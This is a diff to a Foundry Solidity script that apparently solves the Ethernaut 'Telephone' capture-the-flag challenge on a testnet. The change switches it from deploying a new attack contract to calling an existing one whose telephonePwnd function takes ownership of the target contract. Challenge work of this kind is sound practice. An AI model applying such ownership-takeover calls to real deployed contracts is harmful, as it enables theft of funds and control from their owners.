@@ -5,14 +5,14 @@ import { Script } from "forge-std/script.sol";
 
 import { TelephoneAttack } from "src/Telephone/TelephoneAttack.sol";
 
-contract TelephoneAttackScript is Script {
+contract TelephoneAttackExistingScript is Script {
     // Affected contract: https://rinkeby.etherscan.io/address/0x9c8c5967d7168f12adc32fb96efadabdb96bed9f#readContract
     TelephoneAttack private telAttack;
 
     function run() public {
         vm.startBroadcast();
-            telAttack = new TelephoneAttack();
-            telAttack.telephonePwnd(address(0x69)); // this should be your address to complete the challenge
+            TelephoneAttack telAttacker = TelephoneAttack(address(0x04B350F41274FcBd7fa2B903EE64b0AFCFE2753f));
+            telAttacker.telephonePwnd(address(msg.sender));
         vm.stopBroadcast();
     }
 }
